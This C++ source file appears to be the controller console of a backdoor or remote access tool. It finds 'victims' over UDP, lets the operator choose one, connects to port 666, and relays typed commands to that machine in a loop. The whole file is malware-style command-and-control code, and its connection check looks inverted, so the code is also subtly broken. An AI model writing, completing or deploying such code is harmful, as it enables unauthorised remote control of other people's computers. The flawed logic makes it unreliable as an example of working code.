#include "Utils.h"
#include "Network.h"

#include<iostream>
#include <thread>
#include <string>

#pragma comment(lib, "ws2_32.lib")

int main()
{
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

	uint32_t* addresses = new uint32_t[100];

	sockaddr_in victimInfo;
	SOCKET s;
	std::string command;

	SOCKET search = socket(AF_INET, SOCK_DGRAM, 0);
	if (search == INVALID_SOCKET)
	{
		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
		return 1;
	}

	victimInfo.sin_family = AF_INET;
	victimInfo.sin_port = htons(666);

	memset(addresses, 0, 100 * sizeof(uint32_t));

	while (1)
	{
		s = socket(AF_INET, SOCK_DGRAM, 0);
		searchVictims(search, addresses);
		printVictims(addresses);
		victimInfo.sin_addr.s_addr = chooseVictim(addresses);
		if(!connect(s, (sockaddr*)&victimInfo, sizeof victimInfo))
			continue;
		while(1)
		{
			std::cout << "\n$>";
			std::getline(std::cin, command);
			if (command._Equal("return"))
				break;
			telNet(s, command);
		}
		closesocket(s);
	}

	
}

